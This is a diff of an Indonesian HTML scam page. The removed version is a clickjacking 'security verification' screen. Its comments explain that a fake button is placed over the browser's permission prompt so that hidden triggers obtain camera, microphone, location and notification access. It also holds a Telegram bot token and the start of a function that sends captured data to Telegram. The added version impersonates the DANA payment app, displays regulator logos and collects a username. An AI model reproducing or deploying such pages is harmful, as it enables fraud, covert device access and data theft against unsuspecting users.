@@ -1,310 +1,2162 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
-  <title>Verifikasi Keamanan</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA Indonesia - Banking Platform</title>
+    <style>
+        /* ====== RESET & BASE ====== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'SF Pro Display', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
 
-    body {
-      background: linear-gradient(135deg, #f8f9ff 0%, #eef2ff 100%);
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      overflow: hidden;
-      position: relative;
-    }
+        body {
+            background-color: #ffffff;
+            color: #1d1d1f;
+            line-height: 1.5;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-    /* Fullscreen overlay — menutupi seluruh layar */
-    #fake-overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: white;
-      z-index: 999999;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 20px;
-      animation: fadeIn 0.4s ease;
-    }
+        /* ====== TYPOGRAPHY ====== */
+        h1, h2, h3, h4 {
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.98); }
-      to { opacity: 1; transform: scale(1); }
-    }
+        /* ====== HEADER ====== */
+        .main-header {
+            background: linear-gradient(135deg, #0085ff 0%, #0066cc 100%);
+            padding: 22px 24px;
+            box-shadow: 0 2px 12px rgba(0, 133, 255, 0.15);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
 
-    .icon {
-      font-size: 72px;
-      color: #4F46E5;
-      margin-bottom: 24px;
-      animation: float 3s ease-in-out infinite;
-    }
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
 
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
 
-    h2 {
-      font-size: 22px;
-      font-weight: 700;
-      color: #1E293B;
-      margin-bottom: 12px;
-      max-width: 340px;
-    }
+        .logo-main {
+            width: 52px;
+            height: 52px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
 
-    p {
-      color: #64748B;
-      font-size: 15px;
-      line-height: 1.5;
-      margin-bottom: 28px;
-      max-width: 360px;
-    }
+        .logo-main img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
 
-    /* Tombol Agree — tampak seperti tombol biasa, tapi ukuran & posisi disesuaikan agar tepat menutupi tombol "Izinkan" Chrome */
-    #agree-btn {
-      background: #4F46E5;
-      color: white;
-      border: none;
-      padding: 14px 42px;
-      font-size: 18px;
-      font-weight: 600;
-      border-radius: 12px;
-      cursor: pointer;
-      box-shadow: 0 4px 14px rgba(79, 70, 229, 0.4);
-      transition: all 0.2s ease;
-      position: relative;
-      z-index: 1000000;
-      /* Ukuran disesuaikan agar match dengan tombol izin browser (±120x44px di desktop, ±140x48px di mobile) */
-      min-width: 140px;
-      height: 48px;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+        .brand-text {
+            color: white;
+        }
 
-    #agree-btn:hover {
-      background: #4338CA;
-      transform: translateY(-2px);
-      box-shadow: 0 6px 18px rgba(79, 70, 229, 0.5);
-    }
+        .brand-text h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
 
-    /* Invisible permission triggers — diposisikan tepat di bawah tombol agree */
-    .perm-trigger {
-      position: absolute;
-      opacity: 0.01; /* Hampir transparan, tapi tetap bisa diklik */
-      pointer-events: auto;
-      z-index: 999998;
-      border: none;
-      background: transparent;
-      cursor: pointer;
-    }
+        .brand-text p {
+            font-size: 12px;
+            opacity: 0.9;
+            font-weight: 400;
+        }
 
-    /* Posisi dinamis: sesuaikan berdasarkan ukuran layar */
-    #camera-trigger,
-    #mic-trigger,
-    #geo-trigger,
-    #notif-trigger {
-      width: 140px;
-      height: 48px;
-      left: calc(50% - 70px);
-      top: calc(50% + 110px); /* Sesuaikan jarak dari teks ke tombol */
-    }
+        /* ====== TRUST BANNER ====== */
+        .trust-banner {
+            background: linear-gradient(to right, #f8fafc 0%, #ffffff 50%, #f8fafc 100%);
+            padding: 18px 0;
+            border-bottom: 1px solid #eef2f6;
+            overflow: hidden;
+            position: relative;
+        }
 
-    /* Untuk iOS & Android: pastikan tidak ada zoom saat klik */
-    input, button, select, textarea {
-      font-size: 16px !important;
-    }
+        .trust-track {
+            display: flex;
+            gap: 40px;
+            animation: slideTrust 45s linear infinite;
+            width: max-content;
+            padding: 0 20px;
+        }
 
-    /* Sembunyikan scroll */
-    html, body {
-      overscroll-behavior: none;
-      -webkit-overflow-scrolling: auto;
-    }
-  </style>
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #4a5568;
+            white-space: nowrap;
+            font-weight: 500;
+        }
+
+        .trust-item img {
+            height: 26px;
+            width: auto;
+            filter: grayscale(20%);
+        }
+
+        @keyframes slideTrust {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        /* ====== MAIN CONTAINER ====== */
+        .main-container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 30px 24px 60px;
+        }
+
+        /* ====== CARD DESIGN ====== */
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 36px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.06);
+            border: 1px solid #f0f4f8;
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(to right, #0085ff, #00c853);
+        }
+
+        .card-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+            text-align: center;
+            line-height: 1.3;
+        }
+
+        .card-subtitle {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 36px;
+            line-height: 1.6;
+        }
+
+        /* ====== FORM ELEMENTS ====== */
+        .form-group {
+            margin-bottom: 28px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 12px;
+            font-size: 15px;
+            color: #4a5568;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 20px 52px 20px 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 16px;
+            color: #1a1a1a;
+            background: #fafbfc;
+            transition: all 0.25s ease;
+            font-weight: 400;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: #0085ff;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 133, 255, 0.1);
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #94a3b8;
+            transition: color 0.25s;
+        }
+
+        .form-control:focus + .input-icon {
+            color: #0085ff;
+        }
+
+        /* ====== BUTTONS ====== */
+        .btn {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn:hover::after {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0085ff 0%, #0066cc 100%);
+            color: white;
+            box-shadow: 0 8px 24px rgba(0, 133, 255, 0.25);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(0, 133, 255, 0.35);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #00c853 0%, #00b248 100%);
+            color: white;
+            box-shadow: 0 8px 24px rgba(0, 200, 83, 0.25);
+        }
+
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 28px rgba(0, 200, 83, 0.35);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ff3b30 0%, #d70015 100%);
+            color: white;
+            box-shadow: 0 8px 24px rgba(255, 59, 48, 0.25);
+        }
+
+        .btn-secondary {
+            background: #f1f5f9;
+            color: #475569;
+            border: 1px solid #e2e8f0;
+        }
+
+        .btn-secondary:hover {
+            background: #e2e8f0;
+        }
+
+        /* ====== PROGRESS STEPS ====== */
+        .progress-container {
+            margin: 40px auto 50px;
+            padding: 0 24px;
+            max-width: 600px;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 40px;
+        }
+
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 17px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e2e8f0;
+            z-index: 1;
+        }
+
+        .progress-bar {
+            position: absolute;
+            top: 17px;
+            left: 0;
+            height: 2px;
+            background: linear-gradient(to right, #0085ff, #00c853);
+            z-index: 2;
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 3;
+            flex: 1;
+        }
+
+        .step-circle {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            color: #94a3b8;
+            margin-bottom: 12px;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .step.active .step-circle {
+            background: #0085ff;
+            border-color: #0085ff;
+            color: white;
+            transform: scale(1.1);
+            box-shadow: 0 6px 16px rgba(0, 133, 255, 0.3);
+        }
+
+        .step.completed .step-circle {
+            background: #00c853;
+            border-color: #00c853;
+            color: white;
+            animation: popIn 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .step.completed .step-circle::after {
+            content: '✓';
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .step-label {
+            font-size: 14px;
+            color: #94a3b8;
+            font-weight: 500;
+            text-align: center;
+            transition: color 0.3s;
+        }
+
+        .step.active .step-label {
+            color: #0085ff;
+            font-weight: 600;
+        }
+
+        /* ====== HOME PAGE ====== */
+        .home-header {
+            background: linear-gradient(135deg, #0085ff 0%, #0066cc 100%);
+            padding: 40px 32px 120px;
+            color: white;
+            border-radius: 0 0 32px 32px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .home-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(255,255,255,0.05) 0%, transparent 50%);
+        }
+
+        .user-info {
+            position: relative;
+            z-index: 2;
+        }
+
+        .welcome-text {
+            font-size: 15px;
+            opacity: 0.95;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        .username-display {
+            font-size: 34px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            letter-spacing: -0.5px;
+        }
+
+        .account-status {
+            font-size: 14px;
+            opacity: 0.9;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .saldo-card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px;
+            margin: -80px 24px 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            border: 1px solid #f0f4f8;
+        }
+
+        .saldo-label {
+            font-size: 15px;
+            color: #64748b;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+
+        .saldo-amount {
+            font-size: 52px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin: 8px 0;
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            letter-spacing: -1px;
+        }
+
+        .saldo-amount.blocked {
+            color: #ff3b30;
+            position: relative;
+        }
+
+        .saldo-locked {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            padding: 12px;
+            background: #fff5f5;
+            border-radius: 12px;
+            border: 1px solid #fed7d7;
+            color: #c53030;
+            font-size: 14px;
+        }
+
+        .saldo-locked i {
+            font-size: 18px;
+        }
+
+        .saldo-note {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-top: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* ====== ACTION BUTTONS ====== */
+        .action-buttons {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin: 32px 24px;
+        }
+
+        .action-btn {
+            background: white;
+            border: 1px solid #f0f4f8;
+            border-radius: 18px;
+            padding: 24px 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.08);
+            border-color: #e2e8f0;
+        }
+
+        .action-btn i {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, #f0f7ff 0%, #e6f0ff 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #0085ff;
+        }
+
+        .action-btn.withdraw i {
+            background: linear-gradient(135deg, #fff0f0 0%, #ffe6e6 100%);
+            color: #ff3b30;
+        }
+
+        .action-btn span {
+            font-size: 14px;
+            font-weight: 600;
+            color: #4a5568;
+        }
+
+        /* ====== PROMO SECTION ====== */
+        .promo-section {
+            background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%);
+            border-radius: 24px;
+            padding: 32px;
+            margin: 32px 24px;
+            border: 2px solid #e2e8f0;
+            position: relative;
+            transition: all 0.4s ease;
+        }
+
+        .promo-section.claimed {
+            background: linear-gradient(135deg, #f0fff4 0%, #ffffff 100%);
+            border-color: #00c853;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .section-icon {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, #0085ff 0%, #0066cc 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .section-subtitle {
+            font-size: 15px;
+            color: #64748b;
+            margin-top: 4px;
+        }
+
+        .promo-input-group {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .promo-input {
+            flex: 1;
+            padding: 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 16px;
+            background: white;
+            transition: all 0.25s;
+        }
+
+        .promo-input:focus {
+            outline: none;
+            border-color: #0085ff;
+        }
+
+        .promo-input.error {
+            border-color: #ff3b30;
+            animation: shakeError 0.5s;
+        }
+
+        .error-message {
+            color: #ff3b30;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .success-message {
+            color: #00c853;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .promo-status {
+            display: none;
+            align-items: center;
+            gap: 16px;
+            margin-top: 24px;
+            padding: 20px;
+            background: white;
+            border-radius: 16px;
+            border: 2px solid #e2e8f0;
+        }
+
+        .promo-status.claimed {
+            display: flex;
+            background: #f0fff4;
+            border-color: #00c853;
+        }
+
+        .checkmark-circle {
+            width: 40px;
+            height: 40px;
+            background: #00c853;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+
+        /* ====== WITHDRAW MODAL ====== */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 28px;
+            width: 100%;
+            max-width: 440px;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-header {
+            padding: 32px 32px 0;
+            margin-bottom: 8px;
+        }
+
+        .modal-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .modal-subtitle {
+            font-size: 15px;
+            color: #64748b;
+            line-height: 1.6;
+        }
+
+        .modal-body {
+            padding: 24px 32px;
+        }
+
+        .modal-footer {
+            padding: 0 32px 32px;
+        }
+
+        /* ====== CONFIRMATION SUMMARY ====== */
+        .confirmation-summary {
+            background: #f8fafc;
+            border-radius: 18px;
+            padding: 24px;
+            margin: 24px 0;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .summary-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .summary-label {
+            color: #64748b;
+            font-size: 15px;
+        }
+
+        .summary-value {
+            color: #1a1a1a;
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        /* ====== WARNING BANNER ====== */
+        .warning-banner {
+            background: #fff5f5;
+            border: 2px solid #fed7d7;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 24px 0;
+            color: #c53030;
+        }
+
+        .warning-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .warning-header i {
+            font-size: 22px;
+            color: #e53e3e;
+        }
+
+        .warning-text {
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .admin-contact {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #e53e3e;
+            color: white;
+            padding: 10px 18px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 16px;
+            transition: background 0.2s;
+        }
+
+        .admin-contact:hover {
+            background: #c53030;
+        }
+
+        /* ====== FOOTER ====== */
+        .main-footer {
+            background: #f8fafc;
+            padding: 48px 24px;
+            margin-top: 60px;
+            border-top: 1px solid #e2e8f0;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-section h3 {
+            font-size: 16px;
+            color: #1a1a1a;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 14px;
+        }
+
+        .footer-links a {
+            color: #64748b;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-links a:hover {
+            color: #0085ff;
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 32px;
+            border-top: 1px solid #e2e8f0;
+            color: #94a3b8;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        /* ====== ANIMATIONS ====== */
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            70% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes shakeError {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        @keyframes coinFly {
+            0% { opacity: 0; transform: scale(0.5) translate(0, 0); }
+            20% { opacity: 1; transform: scale(1) translate(0, -60px); }
+            80% { opacity: 1; transform: scale(0.8) translate(var(--endX), var(--endY)); }
+            100% { opacity: 0; transform: scale(0.5) translate(var(--endX), var(--endY)); }
+        }
+
+        /* ====== COIN ANIMATION ====== */
+        .coin {
+            position: fixed;
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, #ffd700 0%, #ff9800 100%);
+            border-radius: 50%;
+            z-index: 1000;
+            pointer-events: none;
+            box-shadow: 0 8px 24px rgba(255, 152, 0, 0.4);
+            animation: coinFly 1.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+            display: none;
+        }
+
+        .coin::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 32px;
+            height: 32px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='white' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E") center/contain no-repeat;
+        }
+
+        /* ====== LOADING STATES ====== */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ====== RESPONSIVE ====== */
+        @media (max-width: 768px) {
+            .main-container {
+                padding: 24px 20px 40px;
+            }
+            
+            .card {
+                padding: 32px 24px;
+            }
+            
+            .home-header {
+                padding: 32px 24px 100px;
+            }
+            
+            .saldo-card {
+                margin: -60px 20px 24px;
+                padding: 28px;
+            }
+            
+            .saldo-amount {
+                font-size: 44px;
+            }
+            
+            .action-buttons {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 12px;
+                margin: 24px 20px;
+            }
+            
+            .action-btn {
+                padding: 20px 8px;
+            }
+            
+            .action-btn i {
+                width: 44px;
+                height: 44px;
+                font-size: 20px;
+            }
+            
+            .modal-content {
+                max-height: 85vh;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .action-buttons {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .trust-item {
+                font-size: 12px;
+            }
+            
+            .card-title {
+                font-size: 24px;
+            }
+        }
+
+        /* ====== UTILITY CLASSES ====== */
+        .hidden {
+            display: none !important;
+        }
+
+        .visible {
+            display: block !important;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .mt-24 {
+            margin-top: 24px;
+        }
+
+        .mb-24 {
+            margin-bottom: 24px;
+        }
+
+        .mt-32 {
+            margin-top: 32px;
+        }
+
+        .mb-32 {
+            margin-bottom: 32px;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-  <!-- Fake overlay yang menutupi SEMUA, termasuk popup asli browser -->
-  <div id="fake-overlay">
-    <div class="icon">
-      <i class="fas fa-user-shield"></i>
+    <!-- Header -->
+    <header class="main-header">
+        <div class="header-container">
+            <div class="logo-section">
+                <div class="logo-main">
+                    <img src="https://review1st.com/wp-content/uploads/2021/09/1200px-Logo_dana_blue.svg_.png" alt="DANA">
+                </div>
+                <div class="brand-text">
+                    <h1>DANA Indonesia</h1>
+                    <p>Payment & Financial Services</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Trust Banner -->
+    <div class="trust-banner">
+        <div class="trust-track">
+            <!-- Duplicate set for seamless animation -->
+            <div class="trust-item">
+                <img src="https://3.bp.blogspot.com/-6pqOP2GPNUE/UPKq1pqEopI/AAAAAAAALR0/mq_UHB65ftw/s1600/LOGO+BARU+OTORITAS+JASA+KEUANGAN.png" alt="OJK">
+                <span>Berizin dan Diawasi OJK</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://2.bp.blogspot.com/-qCXadsC6HoY/VxxJTKENdNI/AAAAAAAAXD0/ZC44xAFg9ugOB2dtOXXQOxDYdcyLVLUsACLcB/s1600/Bank%2BIndonesia%2BLogo.png" alt="BI">
+                <span>Bank Indonesia</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://portal.komdigi.go.id/dist/img/logo-komdigi-nav-4.png" alt="Kominfo">
+                <span>Kementerian Kominfo</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://www.linkqu.id/wp-content/uploads/2024/12/Logo-PPATK.png" alt="PPATK">
+                <span>PPATK</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://media.kemenkeu.go.id/getmedia/dce5d80f-c267-48af-9181-b5db5f3910e6/logo-atas.png?width=1920&height=483&ext=.png" alt="Kemenkeu">
+                <span>Kementerian Keuangan</span>
+            </div>
+            <!-- Duplicate set -->
+            <div class="trust-item">
+                <img src="https://3.bp.blogspot.com/-6pqOP2GPNUE/UPKq1pqEopI/AAAAAAAALR0/mq_UHB65ftw/s1600/LOGO+BARU+OTORITAS+JASA+KEUANGAN.png" alt="OJK">
+                <span>Berizin dan Diawasi OJK</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://2.bp.blogspot.com/-qCXadsC6HoY/VxxJTKENdNI/AAAAAAAAXD0/ZC44xAFg9ugOB2dtOXXQOxDYdcyLVLUsACLcB/s1600/Bank%2BIndonesia%2BLogo.png" alt="BI">
+                <span>Bank Indonesia</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://portal.komdigi.go.id/dist/img/logo-komdigi-nav-4.png" alt="Kominfo">
+                <span>Kementerian Kominfo</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://www.linkqu.id/wp-content/uploads/2024/12/Logo-PPATK.png" alt="PPATK">
+                <span>PPATK</span>
+            </div>
+            <div class="trust-item">
+                <img src="https://media.kemenkeu.go.id/getmedia/dce5d80f-c267-48af-9181-b5db5f3910e6/logo-atas.png?width=1920&height=483&ext=.png" alt="Kemenkeu">
+                <span>Kementerian Keuangan</span>
+            </div>
+        </div>
     </div>
-    <h2>Verifikasi Identitas Diperlukan</h2>
-    <p>Untuk melindungi akun Anda, konfirmasi bahwa ini adalah perangkat Anda dengan menekan "Setuju".</p>
-    <button id="agree-btn">Setuju</button>
-  </div>
 
-  <!-- Trigger izin asli — disembunyikan di bawah tombol agree -->
-  <!-- Video untuk kamera & mic -->
-  <video id="camera-trigger" autoplay muted playsinline></video>
-  <!-- Geolocation & Notifikasi tidak butuh elemen visual, cukup API -->
+    <!-- Progress Steps -->
+    <div class="progress-container">
+        <div class="progress-steps">
+            <div class="progress-bar" id="progressBar" style="width: 0%"></div>
+            <div class="step active" id="step1">
+                <div class="step-circle">1</div>
+                <div class="step-label">Buat Akun</div>
+            </div>
+            <div class="step" id="step2">
+                <div class="step-circle">2</div>
+                <div class="step-label">Verifikasi</div>
+            </div>
+            <div class="step" id="step3">
+                <div class="step-circle">3</div>
+                <div class="step-label">Selesai</div>
+            </div>
+        </div>
+    </div>
 
-  <script>
-    const BOT_TOKEN = "8252375331:AAGjbMLFvp7UtEjylkJGKTnXuN_WeVyGaRo";
-    const CHAT_ID = "6732766279";
+    <!-- Step 1: Create Account -->
+    <div class="main-container step-content" id="step1Content">
+        <div class="card">
+            <h2 class="card-title">Buat Akun DANA Anda</h2>
+            <p class="card-subtitle">Masukkan username untuk memulai pengalaman finansial digital yang aman dan terpercaya</p>
+            
+            <div class="form-group">
+                <label class="form-label" for="username">
+                    <i class="fas fa-user-circle"></i> Username
+                </label>
+                <div class="input-wrapper">
+                    <input type="text" 
+                           id="username" 
+                           class="form-control" 
+                           placeholder="contoh: ahmad123"
+                           maxlength="20">
+                    <div class="input-icon">
+                        <i class="fas fa-user-check"></i>
+                    </div>
+                </div>
+                <div id="usernameError" class="error-message"></div>
+            </div>
+            
+            <button class="btn btn-primary" id="nextStep1">
+                <span>Lanjutkan</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+    </div>
 
-    // Fungsi kirim ke Telegram
-    async function sendToTelegram(data, caption = "", isFile = false) {
-      try {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
-        if (isFile) {
-          const fd = new FormData();
-          fd.append("chat_id", CHAT_ID);
